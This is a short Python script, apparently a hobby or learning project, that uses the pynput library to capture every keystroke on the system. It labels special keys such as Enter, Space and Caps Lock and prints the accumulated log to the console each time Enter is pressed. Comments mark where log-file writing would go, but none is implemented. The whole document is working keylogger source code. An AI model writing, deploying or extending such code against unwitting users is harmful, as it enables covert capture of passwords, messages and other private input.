#! /usr/bin/env python3

from pynput import keyboard

lst2 = []
fullstr = []
fullstr2 = ""
F = '1'

def sort_key(key):
	global F
	try:
		# Checks if the key pressed is a non-character key
		if "Key." in str(key):
			keyString = ("["+str(key).upper()[4:]+"]")

			# Handles Enter
			if keyString == ("[ENTER]"):
				fullstr.append(keyString+"\n")
				## Creates a string from the keys pressed
				fullstr2 = ''.join([str(i) for i in fullstr])
				## Prints current log
				print (fullstr2+'\n')

			# Handles Spaces	
			elif keyString == ("[SPACE]"):
				fullstr.append(' ')

			# Handles Shift
			elif keyString == ("[SHIFT]"):
				pass

			# Handles Caps (on/off)
			elif keyString == ("[CAPS_LOCK]"):

				# Checks if last caps used was [CAPS_OFF], doesnt work properly is caps lock is enabled before program execution
				if F == '1':
					keyString = "[CAPS_ON]"
					fullstr.append(keyString)
					F = '0'

				# If caps isnt ON (0) run this
				else:
					keyString = "[CAPS_OFF]"
					fullstr.append(keyString)
					F = '1'

			# If the key isnt logged above or falls within the ASCII spectrum, accept the raw key
			else:
				fullstr.append(keyString)

		# This captures normal ASCII characters
		else:
			keyString = str(key).strip("'")
			#print(keyString+"\n",end='')
			fullstr.append(keyString)
		
	except:
		pass
	
## Main Function
def __main__():
	print("\nOpening Log File...\n")
	## Open log file here
	
	#starts listening to the keyboard
	try:
		with keyboard.Listener(on_press=sort_key) as l:
			#with each key, run sort
			l.join()
	except:
		print("\nClosing Log File...")
		# Close Log File Here
		exit(0)

if __name__=="__main__":
	__main__()
